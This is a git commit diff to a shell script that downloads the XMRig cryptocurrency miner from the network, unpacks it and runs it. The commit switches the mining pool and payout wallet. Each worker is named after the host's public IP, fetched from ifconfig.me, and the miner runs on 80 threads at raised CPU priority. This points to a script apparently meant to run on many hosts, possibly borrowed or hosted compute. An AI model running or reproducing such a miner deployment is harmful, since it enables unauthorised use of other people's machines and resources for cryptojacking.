7f85274cbb52c43b26465e72f0ebc43716486a87
tevayroxeu <107201972+tevayroxeu@users.noreply.github.com>
2022-06-16 04:06:11 +0700

    Update b.sh

--- b.sh
+++ b.sh
@@ -5,5 +5,5 @@ PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
 npm config set cache /tmp --global
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
 ph add xmrig
-ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o rx.unmineable.com:3333  -u BTC:1NPgcV7FomPoZNuPQKQ1bLFZHhzCAYNEiS.$ip -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive
+ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a cn-heavy/xhv -o cryptonight_haven.mine.zergpool.com:4452 -u TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7.$ip -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive
 
